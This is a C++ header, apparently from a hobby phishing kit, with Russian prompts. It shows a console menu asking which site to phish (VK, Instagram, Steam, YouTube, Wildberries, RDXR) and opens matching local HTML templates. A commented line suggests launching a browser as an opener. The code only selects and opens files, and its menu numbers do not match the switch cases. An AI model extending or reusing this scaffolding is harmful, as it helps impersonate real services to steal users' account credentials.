#ifndef FISHER_H
#define FISHER_H
#include <fstream>

//system("start iexplore.exe \"www.cyberforum.ru\""); - мб пойдет как открывашка


int fisher_func_choose_act()
{
    std::cout << "Выберите сайт для фишинга:";
    int fisher_func_choose_act; std::cin >> fisher_func_choose_act; std::cin.ignore(32767, '\n');
    return fisher_func_choose_act;
}

int fisher_func_choose()
{
    int usr_choose_var = fisher_func_choose_act();
    std::fstream vk;
    std::fstream inst;
    std::fstream steam;
    std::fstream yt;
    std::fstream wb;
    std::fstream rdxr;
    switch(usr_choose_var)
    {
        case 1:
            vk.open("fisher_html/vk.html");
            break;
        case 2:
            inst.open("fisher_html/inst.html");
            break;
        case 3:
            steam.open("fisher_html/steam.html");
            break;
        case 4:
            yt.open("fisher_html/yt.html");
            break;
        case 5:
            wb.open("fisher_html/wb.html");
            break;
        case 6:
            rdxr.open("fisher_html/rdxr.html");
            break;
        default:
            std::cout << "Error";
    }
    return 0;
}

int fisher_func()
{
    std::cout <<"\n╭────────────────────────────────────────────╮\n";
    std::cout <<"│                ВЫБЕРИТЕ САЙТ               │\n";
    std::cout <<"│============================================│\n";
    std::cout <<"│ 1) VK                                      │\n";
    std::cout <<"│ 2) Instagramm                              │\n";
    std::cout <<"│ 4) Steam                                   │\n";
    std::cout <<"│ 5) Youtube                                 │\n";
    std::cout <<"│ 6) Wildberries                             │\n";
    std::cout <<"│ 3) RDXR                                    │\n";
    std::cout <<"│                                            │\n";
    std::cout <<"╰────────────────────────────────────────────╯\n";
    fisher_func_choose();
    return 0;
}

#endif
